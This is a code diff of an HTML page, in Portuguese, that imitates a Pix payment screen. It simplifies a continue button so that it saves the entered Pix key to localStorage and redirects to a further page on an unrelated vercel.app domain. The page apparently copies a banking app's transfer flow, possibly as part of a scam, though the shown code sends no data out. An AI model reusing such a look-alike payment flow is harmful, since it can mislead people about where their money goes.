@@ -90,10 +90,6 @@
             margin-bottom: 10px;
         }
 
-        h1 .big-Q {
-            font-size: 24px;
-        }
-
         .description {
             font-size: 14px;
             color: #666;
@@ -141,42 +137,12 @@
             cursor: not-allowed;
             margin-top: 20px;
             transition: background 0.3s ease;
-            user-select: none;
-            outline: none;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            position: relative;
         }
 
         .button.active {
             background: #007bff;
             color: white;
             cursor: pointer;
-        }
-
-        .loader {
-            display: none;
-            width: 16px;
-            height: 16px;
-            border: 2px solid white;
-            border-top: 2px solid transparent;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin-left: 8px;
-        }
-
-        .button.loading .loader {
-            display: inline-block;
-        }
-
-        .button.loading span {
-            display: none;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
         }
     </style>
 </head>
@@ -193,10 +159,8 @@
     </div>
 
     <div class="content">
-        <h1><span class="big-Q">Q</span>uem você quer pagar?</h1>
-        <p class="description">
-            Digite um nome, CPF/CNPJ, e-mail, <br> celular ou chave aleatória.
-        </p>
+        <h1>Quem você quer pagar?</h1>
+        <p class="description">Digite um e-mail, CPF/CNPJ, celular ou chave aleatória.</p>
     </div>
 </div>
 
@@ -205,9 +169,8 @@
         <label for="pix-input" class="input-label">Digitar chave</label>
         <input type="text" id="pix-input" oninput="validateInput()">
     </div>
-    <button id="continue-button" class="button" disabled onclick="showLoader()">
-        <span>Continuar</span>
-        <div class="loader"></div>
+    <button id="continue-button" class="button" disabled onclick="savePixKey()">
+        Continuar
     </button>
 </div>
 
@@ -225,24 +188,10 @@
         }
     }
 
-    function showLoader() {
-        let continueButton = document.getElementById("continue-button");
-        let loader = continueButton.querySelector(".loader");
-        let buttonText = continueButton.querySelector("span");
-        let pixInput = document.getElementById("pix-input").value.trim();
-
-        if (pixInput.length > 0) {
-            // Salvar chave Pix no localStorage
-            localStorage.setItem("chavePix", pixInput);
-
-            continueButton.classList.add("loading");  
-            loader.style.display = "inline-block";
-            buttonText.style.display = "none";
-
-            setTimeout(() => {
-                window.location.href = "https://so2-market-data.vercel.app/PixP3.html";
-            }, 1000);
-        }
+    function savePixKey() {
+        let pixKey = document.getElementById("pix-input").value.trim();
+        localStorage.setItem("pixKey", pixKey);
+        window.location.href = "https://so2-market-data.vercel.app/PixP3.html";
     }
 </script>
 
